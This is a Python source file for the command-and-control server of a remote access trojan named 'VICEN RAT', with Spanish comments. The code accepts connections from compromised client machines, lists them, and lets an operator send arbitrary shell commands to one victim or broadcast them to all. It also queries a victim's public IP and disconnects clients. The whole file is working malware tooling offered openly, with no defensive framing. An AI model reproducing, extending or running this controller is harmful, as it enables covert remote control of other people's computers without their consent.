import socket
import threading
import os
import time
from datetime import datetime
from colorama import Fore
import ctypes
import sys


clients = {}
active_target = None

# Lista de comandos soportados
help_commands = {
    "/help": "Muestra esta ayuda",
    "back / exit": "Salir del cliente o broadcast mode",
    "broadcast": "Enviar un comando a todos los clientes conectados",
    "cls": "Limpiar pantalla",
    "cd <path>": "Cambiar directorio en el cliente",
    "pwd": "Mostrar directorio actual en el cliente",
    "ls <path>": "Listar archivos en la ruta del cliente",
    "getip": "Obtener IP pública del cliente"
    ,"disconnect <n>": "Desconectar cliente por número (kick)"
}

def logo():
    print(f"{Fore.RED}██▒   █▓ ██▓ ▄████▄  ▓█████ ▓█████  ███▄    █     ██▀███   ▄▄▄     ▄▄▄█████▓")
    print(f"▓██░   █▒▓██▒▒██▀ ▀█  ▓█   ▀ ▓█   ▀  ██ ▀█   █    ▓██ ▒ ██▒▒████▄   ▓  ██▒ ▓▒")
    print(f"▓██  █▒░▒██▒▒▓█    ▄ ▒███   ▒███   ▓██  ▀█ ██▒   ▓██ ░▄█ ▒▒██  ▀█▄ ▒ ▓██░ ▒░")
    print(f"  ▒██ █░░░██░▒▓▓▄ ▄██▒▒▓█  ▄ ▒▓█  ▄ ▓██▒  ▐▌██▒   ▒██▀▀█▄  ░██▄▄▄▄██░ ▓██▓ ░") 
    print(f"   ▒▀█░  ░██░▒ ▓███▀ ░░▒████▒░▒████▒▒██░   ▓██░   ░██▓ ▒██▒ ▓█   ▓██▒ ▒██▒ ░") 
    print(f"   ░ ▐░  ░▓  ░ ░▒ ▒  ░░░ ▒░ ░░░ ▒░ ░░ ▒░   ▒ ▒    ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ▒ ░░")   
    print(f"   ░ ░░   ▒ ░  ░  ▒    ░ ░  ░ ░ ░  ░░ ░░   ░ ▒░     ░▒ ░ ▒░  ▒   ▒▒ ░   ░")    
    print(f"     ░░   ▒ ░░           ░      ░      ░   ░ ░      ░░   ░   ░   ▒    ░")      
    print(f"      ░   ░  ░ ░         ░  ░   ░  ░         ░       ░           ░  ░")        
    print(f"     ░       ░                                                       {Fore.RESET}")

def handle_client(client_socket, addr):
    clients[addr] = client_socket
    ctypes.windll.kernel32.SetConsoleTitleW(f"VICEN RAT | CONECTED CLIENTS: {len(clients)}")

    while True:
        try:
            response = client_socket.recv(4096).decode()
            if not response:
                break

            # multi-line responde con el header
            header = f"[{addr[0]}:{addr[1]}]"
            ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            print(f"\n{Fore.GREEN}== {header} Output @ {ts} =={Fore.RESET}")
            print(response)
            print(f"{Fore.GREEN}{'=' * (20 + len(header))}{Fore.RESET}\n")

            if active_target == addr:
                sys.stdout.write(f"{addr[0]}> ")
                sys.stdout.flush()

        except (ConnectionResetError, BrokenPipeError, ConnectionAbortedError, OSError):
            break

    print(f"\n{Fore.RESET}[{Fore.RED}!{Fore.RESET}] Client {addr[0]} disconnected.")
    try:
        client_socket.close()
    except Exception:
        pass
    # remueve clientes si todavia hay conectados
    try:
        if addr in clients:
            del clients[addr]
    except Exception:
        pass

def accept_clients(server):
    while True:
        client_socket, addr = server.accept()
        threading.Thread(target=handle_client, args=(client_socket, addr), daemon=True).start()

def show_help():
    print("\n[Comandos disponibles]:")
    for cmd, desc in help_commands.items():
        print(f"  {cmd:<12} - {desc}")
    print()

def start_server(host="0.0.0.0", port=5555):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"[*] Listening on {host}:{port}")   

    threading.Thread(target=accept_clients, args=(server,), daemon=True).start()
    os.system("cls")
    logo()
    print("[!] Waiting for clients connect...")

    while True:
        if not clients:
            # evita el loop
            time.sleep(0.5)
            continue

        print("\n[Connected Clients]")
        print(" Index  IP:Port")
        print(" ------ --------------------")
        for idx, addr in enumerate(clients.keys(), start=1):
            print(f"  {idx:<4} {addr[0]}:{addr[1]}")

        raw = input("\nSelect client number (or 0 to broadcast). Or 'disconnect <n>': ").strip()

        # permite los comandos para desconectar
        if raw.lower().startswith(("disconnect", "kick")):
            parts = raw.split()
            if len(parts) >= 2:
                try:
                    idx = int(parts[1])
                    idx0 = idx - 1
                    if 0 <= idx0 < len(clients):
                        target = list(clients.keys())[idx0]
                        try:
                            clients[target].close()
                        except Exception:
                            pass
                        clients.pop(target, None)
                        print(f"[!] Disconnected client {target[0]}:{target[1]}")
                    else:
                        print("[!] Invalid client index")
                except ValueError:
                    print("[!] Invalid index")
            else:
                print("[!] Usage: disconnect <client_number>")
            continue

        try:
            choice = int(raw) - 1
        except ValueError:
            continue

        if choice == -1:  # Broadcast mode         
            print(f"\nEntering broadcast mode ({len(clients)} clients). Type 'back' or 'exit' to return.")
            while True:
                command = input("broadcast> ")
                if command.lower() in ["exit", "back"]:
                    break
                elif command.lower() == "/help":
                    show_help()
                else:
                    if command.lower().strip() == "ip":
                        send_cmd = "getip"
                    else:
                        send_cmd = command

                    # manda a todos los clientes y saca a los deads
                    dead = []
                    for addr, client in list(clients.items()):
                        try:
                            client.send(send_cmd.encode())
                        except Exception:
                            dead.append(addr)
                    for d in dead:
                        print(f"[!] Removed disconnected client {d[0]}")
                        clients.pop(d, None)

        elif 0 <= choice < len(clients):       
            target_addr = list(clients.keys())[choice]
            global active_target
            active_target = target_addr
            ctypes.windll.kernel32.SetConsoleTitleW(f"VICEN RAT | CONECTED CLIENTS: {len(clients)} | ACTIVE: {target_addr[0]}")
            print(f"\n[Connected -> {target_addr[0]}:{target_addr[1]}] Type /help for commands. 'back' to return.")
            while True:
                try:
                    command = input(f"{target_addr[0]}> ")
                except (KeyboardInterrupt, EOFError):
                    command = "back"

                if command.lower() in ["exit", "back"]:
                    break
                elif command.lower() == "/help":
                    show_help()
                elif command.lower() == "cls":
                    os.system("cls")
                    logo()
                else:
                    try:
                        send_cmd = "getip" if command.lower().strip() == "ip" else command
                        clients[target_addr].send(send_cmd.encode())
                    except Exception as e:
                        print(f"[!] Error sending to client: {e}")
                        clients.pop(target_addr, None)
                        break

            active_target = None
            ctypes.windll.kernel32.SetConsoleTitleW(f"VICEN RAT | CONECTED CLIENTS: {len(clients)}")

        else:
            print("[!] Invalid Selection")

if __name__ == "__main__":
    start_server()
